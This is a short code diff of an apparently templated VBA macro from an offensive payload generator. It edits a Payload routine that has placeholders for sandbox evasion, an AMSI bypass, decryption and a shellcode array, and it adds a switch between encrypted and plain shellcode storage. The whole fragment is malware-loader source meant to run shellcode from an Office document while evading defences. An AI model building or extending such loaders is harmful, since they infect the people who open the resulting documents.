@@ -14,8 +14,13 @@ End Sub
 Private Sub Payload()
 {{ sandbox_block }}
 {{ amsi_block }}
+    {% if is_encrypted %}
     Dim enc As Variant
+    enc = Array({{ shellcode }})
+    {% else %}
+    Dim buf As Variant
     buf = Array({{ shellcode }})
+    {% endif %}
 {{ decrypt_block }}
 
     Dim addr As LongPtr
